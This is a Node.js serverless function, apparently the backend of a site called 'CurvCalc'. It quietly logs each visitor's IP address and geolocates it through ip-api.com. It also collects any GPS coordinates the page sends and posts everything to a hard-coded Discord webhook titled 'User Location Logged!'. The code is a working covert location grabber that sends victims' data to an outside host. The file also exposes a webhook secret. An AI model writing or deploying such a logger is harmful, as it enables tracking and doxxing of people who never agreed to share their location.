const fetch = require('node-fetch');

const config = {
    "webhook": "https://discord.com/api/webhooks/1559957756100874260/BfBCrebeb2RsqQPu-E4kJH8uuRKHJW6tppdD8QqwGCoclh-yKmUpRy-vjM6ropyKytzM",
    "username": "bharatwaffen",
    "color": 0x28a745
};

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const clientIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : '127.0.0.1';
        const { lat, lon } = req.body || {};

        let info = { country: 'Unknown', regionName: 'Unknown', city: 'Unknown', timezone: 'UTC' };
        try {
            const ipRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=country,regionName,city,timezone`);
            info = await ipRes.json();
        } catch (e) {}

        const gpsText = (lat !== undefined && lon !== undefined) ? `\`${Number(lat).toFixed(5)}, ${Number(lon).toFixed(5)}\`` : `Not shared / Denied`;

        const embed = {
            username: config.username,
            content: "@everyone",
            embeds: [{
                title: "CurvCalc - User Location Logged!",
                color: config.color,
                description: `> **IP:** \`${clientIp}\`\n> **Country:** \`${info.country}\`\n> **Region:** \`${info.regionName}\`\n> **City:** \`${info.city}\`\n> **Timezone:** \`${info.timezone}\`\n> **GPS Coords:** ${gpsText}`
            }]
        };

        await fetch(config.webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embed)
        });

        return res.status(200).json({ success: true });
    } catch (err) {
        return res.status(500).json({ error: 'Internal Server Error' });
    }
};
